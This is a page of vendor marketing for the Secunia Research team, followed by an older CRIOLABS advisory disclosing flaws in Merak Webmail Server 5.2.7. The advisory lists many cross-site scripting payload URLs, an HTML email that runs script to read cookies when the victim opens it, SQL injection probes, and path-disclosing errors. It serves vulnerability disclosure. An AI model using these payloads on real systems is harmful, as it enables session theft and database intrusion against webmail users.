How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

****************************************************************************************************
  CRIOLABS
<http://www.criolabs.net>

- Software:  Merak Webmail Server
- Type:      Webmail
- Company:   Merak Mail Server, Inc.

****************************************************************************************************

## Software ##

Software:   Merak Webmail Server
Version:    5.2.7
Plataforms: All Windows platforms
Web:        <http://www.merakmailserver.com/>

## Vendor Description ##

Merak's WebMail Server is used by thousands of companies around the world to provide \
secure (ssl) anytime-anywhere access to home, office or ISP email via a browser or \
WAP-enabled device.

In less than 10 minutes you can have the same professional email server that \
organizations such as NATO, the U.S. Navy, the FBI, Toyota, the U.S. Government, and \
many ISP Providers and Developers depend on every day.

## Vulnerabilities ##

Cross-Site Scripting, Full path disclosure, Exposure of PHP files, SQL-Injection.

## Cross-Site Scripting ##

There are a lot of Input Validation Holes in this soft. An attacker can perform an \
XSS attack and be able to access the target user's cookies.

/address.html?id=[id]&sort=name&selectsort=&global=&showgroups=&showlite=&category="><script>alert()</script>&cserver=&ext=

/address.html?id=[id]&sort=name&selectsort=&global=&showgroups=&showlite=&category=&cserver=">[XSS]&ext=

/address.html?id=[id]&sort=name&selectsort=&global=&showgroups=&showlite=&category=&cserver=&ext=">[XSS]

/address.html?id=[id]&sort=&selectsort=&global=">[XSS]&showgroups=&showlite=&category=&cserver=&ext=

/address.html?id=[id]&sort=&selectsort=&global=&showgroups=">[XSS]&showlite=&category=&cserver=&ext=

/address.html?id=[id]&sort=&selectsort=&global=&showgroups=&showlite=">[XSS]&category=&cserver=&ext=

/settings.html?autoresponder=1&id=[id]&spage=">[XSS]

/settings.html?autoresponder=">[XSS]&id=[id]&spage=0

/readmail.html?id=[id]&folder=">[XSS]

The next files (attachment.html,calendar.html), can be executed without knowing \
user's session ID number.

/attachment.html?attachmentpage_text_error=">[XSS]

/calendar.html?id=1&schedule=admin%40merakdemo.com&cv=n&folder=<script>alert()</script>

/calendar.html?id=1&schedule=koko%40merakdemo.com&sf=addevent&cv=d&ct=">[XSS]

/calendar.html?id=[id]&cv=">[XSS]&ct=[ct]&sf=addevent&ESdhour=8

Also it is possible to inject a XSS in the message directly, example:

Open your mail and write a new message like this :

#Image 1.jpg

<IMG alt="" hspace=0 src="javascript:alert(document.cookie)" align=baseline \
border=0><IFRAME src="<http://www.google.com>"></body> </html> </IFRAME>

Then click on the HTML message checkbox (in order to send it in HTML format) -

#Image 2.jpg and 3.jpg

The XSS will be executed on your browser. If you send the message, the XSS also will \
be executed when the victim read the mail.

#Image 4.jpg

Conclusion: If you send a Content-Type: text/html message with an XSS attack, always \
will be executed when the victim reads the message.

Also you can send the XSS in the Subject. This XSS is executed when the victim reply \
to this is in HTML format.

## Full path disclosure ##

Some variables of adress.html can cause that a remote user may be able to determine \
the installation path.

#Example:

/mail/address.html?id=[id]&sort=criolabs&selectsort=criolabs&global=criolabs&showlite=criolabs&category=criolabs&cserver=&ext=

#Error Example:

Warning: reset(): Passed variable is not an array or object in C:\Archivos de \
programa\Merak\html\mail\address.html on line 565

Warning: Variable passed to each() is not an array or object in C:\Archivos de \
programa\Merak\html\mail\address.html on line 566

Warning: reset(): Passed variable is not an array or object in C:\Archivos de \
programa\Merak\html\mail\inc\function.address.php on line 100

Warning: Variable passed to each() is not an array or object in C:\Archivos de \
programa\Merak\html\mail\inc\function.address.php on line 101

#Example:

/calendar.html?id=6213dcc45fdbccc9af207d32722b93a7&cv=%22criolabs&ct='criolabs&sf='criolabs

#Error Example:

You can see this in the webmail logs:

Warning: mktime(): Windows does not support negative values for this function in \
C:\Archivos de programa\Merak\html\mail\inc\function.calendar.php on line 413

Warning: date(): Windows does not support dates prior to midnight (00:00:00), January \
1, 1970 in C:\Archivos de programa\Merak\html\mail\inc\function.calendar.php on line \
413

Warning: mktime(): Windows does not support negative values for this function in \
C:\Archivos de programa\Merak\html\mail\inc\function.calendar.php on line 417

Warning: mktime(): Windows does not support negative values for this function in \
C:\Archivos de programa\Merak\html\mail\inc\function.calendar.php on line 420

Warning: date(): Windows does not support dates prior to midnight (00:00:00), January \
1, 1970 in C:\Archivos de programa\Merak\html\mail\inc\function.calendar.php on line \
420

Warning: date(): Windows does not support dates prior to midnight (00:00:00), January \
1, 1970 in C:\Archivos de programa\Merak\html\mail\inc\function.calendar.php on line \
350

## Exposure of PHP files ##

The server allows that remote users can download all the files with .php extension \
from the server.

#Example:

<http://localhost:32000/mail/inc/function.php>
<http://localhost:32000/mail/inc/function.view.php>

## SQL-Injection ##

There are Sql-Injection problems in calendar, a remote user may be able to inject SQL \
commands.

/calendar.html?id=1'&schedule=[SQL]

You can see in the logs :

DB Calendaring Error
[Microsoft][Controlador ODBC Microsoft Access]
Error de sintaxis (falta operador) en la expresión de consulta 'OWN_Email = \
''[sql]''.

/calendar.html?id=1&schedule=koko%40merakdemo.com&sf=addevent&cv=d&ct=';'&Eid=criolabs'

DB Calendaring Error [Microsoft][Controlador ODBC Microsoft Access]
